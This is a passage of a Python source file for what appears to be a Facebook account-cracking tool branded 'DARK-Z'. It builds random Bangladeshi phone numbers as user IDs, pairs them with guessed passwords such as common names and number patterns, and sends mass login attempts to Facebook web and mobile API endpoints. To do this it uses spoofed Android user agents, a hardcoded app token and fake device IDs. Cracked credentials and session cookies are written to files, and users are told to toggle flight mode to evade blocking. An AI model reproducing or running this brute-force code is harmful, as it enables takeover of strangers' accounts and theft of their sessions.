    except requests.exceptions.ConnectionError:
        print('\n No internet connection ...')
        exit()

def bd():
    user = []
    clear()
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    os.system('espeak -a 300 " Welcome, to, random, cloning, tool"')
    print(" BD SIM CODE=><>< +88017,+88018,+88019,+88014,+88013,+88015")
    print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
    os.system('espeak -a 300 " Enter, sim ,code"')
    kode = input(' [📞] ENTER SIM CODE: ')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    limit = int(input(' [?] ENTER YOUR CRACK LIMiT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\033[1;33m[♥]  TOTAL IDS :\033[1;92m ' + tl)
        print( "\033[1;33m[♥]  YOUR TARGET CRACK MENU:\033[1;92mRANDOM CLONING")
        print('\033[1;33m[♥]  THE CRACK PROCESS HAS BEEN STARTED')
        print(f"\033[1;33m[♥]  CHOOSEN SIM CODE:\033[1;92m {kode}")
        print("""\033[1;91m\033[1;41m\033[1;97m USE FLIGHT MODE IN EVERY 5 MIN\033[;0m\033[1;91m\033[1;92m""")
        print(50 * '_')
        for guru in user:
            uid = kode + kodex + kod + guru
            pwx = [kode + kodex + kod + guru, kod + guru, kodex + guru, kode + kodex + kod, kod + kodex + kode, kode + kodex, kodex + kod, kodex + kod + guru, kode + guru, 'Bangladesh', 'i love you', 'sadiya', 'fariya', 'sanjida', 'fatema', 'Farjana', 'jannat', '102030', '203040', '304050', '405060', '506070', '607080', '708090', '809010', 'mababa', 'shahin', 'sumaiya']
            yaari.submit(rcrack,uid,pwx,tl)
def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            sys.stdout.write(f'\r\33[1;94m[\033[1;37mDARK-Z\33[1;94m][\033[1;37m%s\33[1;94m/\033[1;37m%s\33[1;94m]\33[1;94m[\033[1;32mOK-%s\33[1;94m]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://p.facebook.com').text
            log_data = {
            "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'p.facebook.com',
            'method': 'GET',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro,
            'viewport-width': '980',
            }
            lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[1;32m[DARK-OK💚] \033[1;32m'+uid+'\033[1;32m • \033[1;32m' +ps+    '  \n[COOKIES🌺] • \033[1;32m'+coki+  '  ''  \033[0;97m')
                os.system('espeak -a 300 " Dark, ok, id"')
                open('/sdcard/RANDOM-OK.txt', 'a').write(uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;30m[DARK-CP💔] ' +uid+ ' • ' +ps+           '  \33[0;97m')
                os.system('espeak -a 300 " CP"')
                open('/sdcard/RANDOM-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
    except:pass

def ffb(ids, names, passlist):
    global loop, oks, cps
    sys.stdout.write('\r\r\033[1;37m[Dark-Z] %s|\033[1;32mOK:-%s \033[1;37m' % (loop, len(oks)))
    sys.stdout.flush()
    session = requests.Session()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Islam'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace(
                'Last', last).replace('first', ps).replace('last', ps2)
            ua = random.choice(ugen)
            head = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
            getlog = session.get(f'https://m.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
            idpass = {"lsd": re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1), "jazoest": re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1), "uid": ids, "next": "https://p.facebook.com/login/save-device/", "flow": "login_no_pin", "pass": pas,}
            complete = session.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass, allow_redirects=False, headers=head)
            Aking = session.cookies.get_dict().keys()
            if "c_user" in Aking:
                print("")
                print('\r\r\033[1;37m[Dark-OK💚] %s | %s' % (ids, pas))
                print('[🌺]=COOKIES ⬇')
                cookies = ""
                for k,v in session.cookies.items():
                    cookies += str(k) + "=" + str(v) + ";"
                print('\r\r\033[1;32m %s' % cookies)
                os.system('espeak -a 300 " Dark, ok, id"')
                open('/sdcard/Dark-OK.txt', 'a').write(ids+'|'+pas+'\n')
                oks.append(ids)
                break
            elif 'checkpoint' in Aking:
                if 'y' in pcp:
                    print('\r\r\x1b[38;5;208m[Dark-CP💔] '+ids+' | '+pas+'\033[1;97m')
                    os.system('espeak -a 300 " CP"')
                    open('/sdcard/Dark-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
                    break
                else:
                    break
            else:
                continue
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    loop += 1


def api(ids, names, passlist):
    try:
        global oks, loop, sim_id, device
        sys.stdout.write(
            '\r\r\033[1;37m[Dark-Z] %s|\033[1;32mOK:-%s \033[1;37m' % (loop, len(oks)))
        sys.stdout.flush()

        fn = names.split(' ')[0]

        try:
            ln = names.split(' ')[1]
        except:
            ln = fn

        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower(
            )).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
            fbbv = str(random.randint(111111111, 999999999))
            android_version = device['android_version']
            model = device['model']
            build = device['build']
            fblc = device['fblc']
            fbcr = sim_id
            fbmf = device['fbmf']
            fbbd = device['fbbd']
            fbdv = device['fbdv']
            fbsv = device['fbsv']
            fbca = device['fbca']
            fbdm = device['fbdm']
            fbfw = '1'
            fbrv = '0'
            fban = 'FB4A'
            fbpn = 'com.facebook.katana'
            ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(
                random.randint(000000000, 999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
            random_seed = random.Random()
            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
            device_id = str(uuid.uuid4())
            secure = str(uuid.uuid4())
            family = str(uuid.uuid4())
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            xd = str(''.join(random_seed.choices(string.digits, k=20)))
            sim_serials = f'["{xd}"]'
            li = ['28', '29', '210']
            li2 = random.choice(li)
            j1 = ''.join(random.choice(string.digits) for _ in range(2))
            jazoest = li2+j1
            data = {
                'adid': adid,
                'format': 'json',
                'device_id': device_id,
                'email': ids,
                'password': pas,
                'generate_analytics_claims': '1',
                'community_id': '',
                "sim_country": "id",
                'try_num': '1',
                'family_device_id': family,
                'sim_serials': sim_serials,
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'logged_out_id': str(uuid.uuid4()),
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'tier': 'regular',
                'reg_instance': str(uuid.uuid4()),
                'meta_inf_fbmeta': '',
                'currently_logged_in_userid': '0',
                'locale': fblc,
                'client_country_code': '',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
            }
            headers = {
                'Authorization': f'OAuth {accessToken}',
                'X-FB-Friendly-Name': 'authenticate',
                'X-FB-Connection-Bandwidth': str(random.randint(2e7, 3e7)),
                'X-FB-Net-HNI': str(random.randint(11111, 99999)),
                'X-FB-SIM-HNI': str(random.randint(11111, 99999)),
                'User-Agent': ua,
                'Accept-Encoding': 'gzip, deflate',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine': 'Liger'
            }
            url = 'https://b-graph.facebook.com/auth/login'
            twf = 'Login approval'+'s are on. '+'Expect an SMS' + \
                ' shortly with '+'a code to use'+' for log in'
            po = requests.post(url, data=data, headers=headers).json()
            if 'session_key' in po:
                print("")
                print('\r\r\033[1;37m[Dark-OK💚] '+ids+' | '+pas+'\033[1;97m')
                print('[🌺]=COOKIES ⬇')
                cookies = ""
                for k,v in po.cookies.items():
                    cookies += str(k) + "=" + str(v) + ";"
                print('\r\r\033[1;32m %s' % cookies)
                os.system('espeak -a 300 " Dark, ok, id"')
                open('/sdcard/Dark-OK.txt', 'a').write(ids+'|'+pas+'\n')
                oks.append(ids)
                break
            elif twf in str(po):
                if 'y' in pcp:
                    print("")
                    print('\r\r \033[1;34m[Dark-2F] '+ids+' | '+pas)
                    twf.append(ids)
                    break
            elif 'www.facebook.com' in po['error']['message']:
                if 'y' in pcp:
                    print('\r\r\x1b[38;5;208m[Dark-CP💔] '+ids+' | '+pas+'\033[1;97m')
                    os.system('espeak -a 300 " CP"')
                    open('/sdcard/Dark-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    break
                    cps.append(ids)
                else:
                    open('/sdcard/Dark-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    break
                    cps.append(ids)
            else:
                continue
        loop += 1
    except Exception as e:
        pass


def api1(ids, names, passlist):
    try:
        global oks, loop, sim_id
        sys.stdout.write(
            '\r\r\033[1;37m[Dark-Z] %s|\033[1;32mOK:-%s \033[1;37m' % (loop, len(oks)))
        sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower(
            )).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
            fbbv = str(random.randint(111111111, 999999999))
            android_version = device['android_version']
            model = device['model']
            build = device['build']
            fblc = device['fblc']
            fbcr = sim_id
            fbmf = device['fbmf']
            fbbd = device['fbbd']
            fbdv = device['fbdv']
            fbsv = device['fbsv']
            fbca = device['fbca']
            fbdm = device['fbdm']
            fbfw = '1'
            fbrv = '0'
            fban = 'FB4A'
            fbpn = 'com.facebook.katana'
            ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(
                random.randint(000000000, 999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
            random_seed = random.Random()
            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
            device_id = str(uuid.uuid4())
            secure = str(uuid.uuid4())
            family = str(uuid.uuid4())
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            xd = str(''.join(random_seed.choices(string.digits, k=20)))
            sim_serials = f'["{xd}"]'
            li = ['28', '29', '210']
            li2 = random.choice(li)
            j1 = ''.join(random.choice(string.digits) for _ in range(2))
            jazoest = li2+j1
            data = {
                'adid': adid,
                'format': 'json',
                'device_id': device_id,
                'email': ids,
                'password': pas,
                "session_id": str(uuid.uuid4()),
                "advertiser_id": str(uuid.uuid4()),
                "reg_instance": str(uuid.uuid4()),
                "logged_out_id": str(uuid.uuid4()),
                "hash_id": str(uuid.uuid4()),
                "sim_country": "id",
                "network_country": "id",
                "enroll_misauth": "false",
                'generate_analytics_claims': '1',
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                "cpl": "true",
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'meta_inf_fbmeta': '',
                'currently_logged_in_userid': '0',
                'fb_api_req_friendly_name': 'authenticate',
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            }
            headers = {
                'Authorization': f'OAuth {accessToken}',
                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                "X-FB-Net-HNI": str(random.randint(900000, 999999)),
                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                'X-FB-Friendly-Name': 'authenticate',
                'X-FB-Connection-Type': 'unknown',
                'User-Agent': ua,
                'Accept-Encoding': 'gzip, deflate',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine': 'Liger'
            }
            url = 'https://b-api.facebook.com/method/auth.login'
            twf = 'Login approval'+'s are on. '+'Expect an SMS' + \
                ' shortly with '+'a code to use'+' for log in'
            po = requests.post(url, data=data, headers=headers).json()

            if 'session_key' in po:
                print("")
                print('\r\r\033[1;37m[Dark-OK💚] '+ids+' | '+pas+'\033[1;97m')
                print('[🌺]=COOKIES ⬇')
                cookies = ""
                for k,v in po.cookies.items():
                    cookies += str(k) + "=" + str(v) + ";"
                print('\r\r\033[1;32m %s' % cookies)
                os.system('espeak -a 300 " Dark, ok, id"')
                open('/sdcard/Dark-OK.txt', 'a').write(ids+'|'+pas+'\n')
                oks.append(ids)
                break
            elif twf in str(po):
                if 'y' in pcp:
                    print("")
                    print('\r\r \033[1;34m[Dark-2F] '+ids+' | '+pas)
                    twf.append(ids)
                    break
            elif 'www.facebook.com' in po['error_msg']:
                if 'y' in pcp:
                    print('\r\r\x1b[38;5;208m[Dark-CP💔] '+ids+' | '+pas+'\033[1;97m')
                    os.system('espeak -a 300 " CP"')
                    open('/sdcard/Dark-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    break
                    cps.append(ids)
                else:
                    open('/sdcard/Dark-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    break
                    cps.append(ids)
            else:
                continue
        loop += 1
    except Exception as e:
        pass


def rndm(ids, passlist):
    global loop
    global oks
    sys.stdout.write(
        '\r\r\033[1;37m[Dark-Z] %s|\033[1;32mOK:-%s \033[1;37m' % (loop, len(oks)))
    sys.stdout.flush()
    try:
        for pas in passlist:
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
            fbbv = str(random.randint(111111111, 999999999))
            android_version = device['android_version']
            model = device['model']
            build = device['build']
            fblc = device['fblc']
            fbcr = sim_id
            fbmf = device['fbmf']
            fbbd = device['fbbd']
            fbdv = device['fbdv']
            fbsv = device['fbsv']
            fbca = device['fbca']
            fbdm = device['fbdm']
            fbfw = '1'
            fbrv = '0'
            fban = 'FB4A'
            fbpn = 'com.facebook.katana'
            ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(
                random.randint(000000000, 999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
            random_seed = random.Random()
            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
            device_id = str(uuid.uuid4())
            secure = str(uuid.uuid4())
            family = str(uuid.uuid4())
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            xd = str(''.join(random_seed.choices(string.digits, k=20)))
            sim_serials = f'["{xd}"]'
            li = ['28', '29', '210']
            li2 = random.choice(li)
            j1 = ''.join(random.choice(string.digits) for _ in range(2))
            jazoest = li2+j1
            data = {
                'adid': adid,
                'format': 'json',
                'device_id': device_id,
                'email': ids,
                'password': pas,
                "logged_out_id": str(uuid.uuid4()),
                "hash_id": str(uuid.uuid4()),
                "reg_instance": str(uuid.uuid4()),
                "session_id": str(uuid.uuid4()),
                "advertiser_id": str(uuid.uuid4()),
                'generate_analytics_claims': '1',
                'credentials_type': 'password',
                'source': 'login',
                "sim_country": "id",
                "network_country": "id",
                "relative_url": "method/auth.login",
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'fb_api_req_friendly_name': 'authenticate',
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            }
            headers = {
                'Authorization': f'OAuth {accessToken}',
                "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                'X-FB-Friendly-Name': 'authenticate',
                'X-FB-Connection-Type': 'unknown',
                'User-Agent': ua,
                'Accept-Encoding': 'gzip, deflate',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine': 'Liger'
            }
            url = 'https://b-graph.facebook.com/auth/login'
            twf = 'Login approval'+'s are on. '+'Expect an SMS' + \
                ' shortly with '+'a code to use'+' for log in'
            po = requests.post(url, data=data, headers=headers).json()
            if 'session_key' in po:
                try:
                    uid = po['uid']
                except:
                    uid = ids
                if str(uid) in oks:
                    break
                else:
                    print("")
                    print('\r\r\033[1;37m[Dark-OK💚] ' +
                          str(uid)+' | '+pas+'\033[1;97m')
                    print('[🌺]=COOKIES ⬇')
                    cookies = ""
                    for k,v in po.cookies.items():
                        cookies += str(k) + "=" + str(v) + ";"
                    print('\r\r\033[1;32m %s' % cookies)
                    os.system('espeak -a 300 " Dark, ok, id"')
                    open('/sdcard/Dark-OK.txt', 'a').write(str(uid)+'|'+pas+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in po['error']['message']:
                try:
                    uid = po['error']['error_data']['uid']
                except:
                    uid = ids
                if uid in oks:
                    pass
                else:
                    print('\r\r\x1b[38;5;208m[Dark-CP💔] '+ids+' | '+pas+'\033[1;97m')
                    os.system('espeak -a 300 " CP"')
                    open('/sdcard/Dark-CP.txt', 'a').write(str(uid)+'|'+pas+'\n')
                    cps.append(str(ids))
                    break
            else:
                continue
        loop += 1
    except Exception as e:
        pass


try:

    menu()
except requests.exceptions.ConnectionError:
    print('\n No internet connection ...')
    exit()
except Exception as e:
    print(e)
